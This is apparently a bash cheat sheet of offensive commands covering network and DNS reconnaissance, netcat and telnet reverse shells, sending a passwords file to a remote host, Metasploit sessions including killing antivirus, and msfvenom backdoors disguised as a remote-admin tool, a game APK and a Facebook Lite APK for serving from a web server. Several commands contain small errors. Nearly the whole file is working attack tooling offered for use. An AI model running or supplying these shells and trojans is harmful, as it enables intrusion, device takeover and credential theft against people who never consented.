#!/bin/bash

## Sees the host for IP
nslookup 1.2.3.4

## Get nameservers for DNS
dig example.com -t ns

## Get email servers for DNS
dig example.com -t mx

## DNS zone transfer
dig axrf example.com @second.ns.com

## Checks DNS subdomains, to populate with more entries for brute force just enter data to /usr/share/dnsenum/dns.txt
dnsenum example.com

## Checks if directory is present in provided host
dirb https://example.com /usr/share/dirb/wordlists/common.txt

## Use Sn1per to get open source intelligence (OSINT) and more reco information
sniper -t scanme.nmap.org -o -re

## Checks open source intelligence (OSINT) using bing limiting 200 results
theHarvester -d example.com -l 200 -b bing -s

## Detects hosts in same network and send them to results.txt
nmap -sn -n 192.168.0.0/16 | grep 192 | cut -d ' ' -f 5 > /vagrant/results.txt

## Checks which ports are open in
nmap -iL /vagrant/results.txt

## Checks if ports 21, 22 and 23 are open in local network
nmap -iL /vagrant/results.txt -p 21-23

## Makes remote host as proxy to the rest of network
sudo nmap -P0 -sI opened.host.ip.port another.host.ip.range

## Scan ports in Decoy mode, by simulating that all hosts in flag made port scan in host
nmap 192.168.15.1 -D 192.168.74.47

## Check which FTP service is running
ftp host.ip.address.without-port

## Uses Netcat to connect via port 80 in HTTP
nc host.ip.address.connection 80
HEAD -> Get the HEAD of connection
GET / -> Get the index of site

## Fingerprint analysis with nmap
sudo nmap -O host.ip.address # Checks OS fingerprint
nmap -sV host.ip.address # Checks Service fingerprint
nmap -A host.ip.address # Checks detailed Service fingerprints

## Runs Nmap scripts (mostly used in attacks)
nmap host.ip.address -p 25 --script script-name # Scripts are in /usr/share/nmap/scripts
nmap host.ip.address -p 25 --script --script-args arg-name=arg-value script-name # How run with arguments

## Sample scripts to enum
nmap host-range -p 25 --script banner
nmap host-range --script nfs-ls
nmap host-range --script smb-enum-shares
nmap host-range --script mysql-info
nmap host-range --script smtp-enum-users
nmap host-range --script ftp-anon

## Analysis wordpress site
wpscan --url wordpress-site.com --api-token xxx

## Finds users in wordpress site
wpscan --url wordpress-site.com --enumerate u --api-token xxx

## Changes mac address manually
ifconfig eth0 down
ifconfig eth0 hw ether 74::74::74::74::74
ifconfig eth0 up

## Opens tor with proxychains
proxychains4 firefox

## Netcat use cases
nc host.ip.address 80 # listen host in port 80
nc host.ip.address -l -p 80 -v # open host to listen in port 80
nc -l -p 2000 -e /bin/bash -v # open host to listen in port 80 and run bash commands
nc 0.tcp.ngrok.io 15560 ## connect to Ngrok host
nc -nlp 3000 -v # opens server to attack
nc host.ip.address 3000 -e /bin/bash # connect to server and in server execute remote commands
nc host.ip.address 3000 -e c:\windows\system32\cmd.exe # connect to server and in server execute remote commands
host.ip.address 1500 < passwords.txt # get file content to send to host
nc -vnlp host.ip.address 1500 > passwords.txt # send output to file to save

## Netcat with encryption
cryptcat -vnlp 4000
./cryptcat host.ip.address 4000 -e /bin/bash

## Netcat with SSL
openssl req -new -newkey rsa:4096 -nodes -keyout rsa.key -out rsa.csr # generates SSL key and certificate request file
openssl x506 -req -sha256 -days 365 -in rsa.csr -signkey rsa.key -out rsa.pem # generates certificate from files generated
ncat -l -n -v -p 443 -e '/bin/bash -i' --ssl --ssl-cert rsa.pem --ssl-key rsa.key # starts server with SSL
nc -C --ssl host.ip.address # connects client to server

## Ngrok - alternative to dynamic dns
ngrok authtoken ngrok-token
ngrok tcp 80

## Reverse connection with telnet
# in server, open two ports to listen
nc -vnlp 3000
nc -vnlp 2000
# in client
telnet host.ip.address 3000 | /bin/bash | telnet host.ip.address 2000

## Metasploit
msfdb init # initialize metasploit db
msfconsole # opens metasploit console
msfconsole -r /vagrant/scripts/connect-windows-xp.rc # uses commands used in quotes

### METASPLOIT CONSOLE ###
? # list metasploit commands
db_status # shows database status
db_export -f xml output.xml # export database info in xml
db_import input.xml # import database info in xml
hosts # show hosts information stored in db
db_nmap -A host.ip.address
search cve:2022 type:exploit app:client # show exploits of 2022 for client applications
search Internet Explorer # show exploits for Internet Explorer
grep good search ms17 # uses grep in search, in this example microsoft exploits that occurred in 2017 and are good
info exploit/windows/smb/ms08_067_netapi # show information of exploit
use exploit/windows/smb/ms08_067_netapi # uses exploit
? # run again to see exploit commands
show options # shows parameters for module work
set VARIABLE value # set the module var value
setg VARIABLE value # same as above but globally
show missing #show missing vars
exploit # execute exploit
background # send current shell to sessions
sessions -l # list metasploit sessions
sessions -i 1 # reenter session 1 running in background
session -u 1 # upgrade a shell to meterpreter in target session
sessions -s checkvm -i 2 # checks if session shell is running in a vm
sessions -s killav -i 2 # kills antivirus processes
sessions -k 1 # kills selected session
sessions -K # kills all sessions
download # downloads file to localhost
##########################

## Creates a backdoor with msfvenom
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.74 LPORT=1234 -f exe > backdoor.exe # creates backdoor using .exe
cp backdoor.exe /var/www/html # copies backdoor to apache server

## Creates android backdoor
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.74 LPORT=1234 R > mortal-kombat.apk # same as above, but for APK
keytool -genkey -v -keystore application.keystore -alias app -keyalg RSA -keysize 2048 -validity 10000 # generates key to android
apksigner sign --ks application.keystore -out app_signed.apk app_signed.apk # signs apk for android
cp mortal-kombat.apk /var/www/html # copies backdoor to apache server

## Prepares msfconsole to receive connections
msfconsole # opens msfconsole and enter commands to await connections when user enter in the executable
use multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.1.74
set lport 1234
set ExitOnSession false
exploit
###

## Creates a windows trojan for backdoor
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.74 LPORT=1234 -x /usr/share/windows-binaries/rdamin.exe -f exe > radmin2.exe # creates backdoor simulating rdamin
cp rdamin2.exe /var/www/html # copies backdoor to apache server

## Creates android trojan
_SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS"
unset _JAVA_OPTIONS
alias 'java "$_SILENT_JAVA_OPTIONS"'
msfvenom -x /home/vagrant/Downloads/facebook-lite.apk -p android/meterpreter/reverse_tcp LHOST=192.168.1.74 LPORT=4444 -o fb-tests.apk
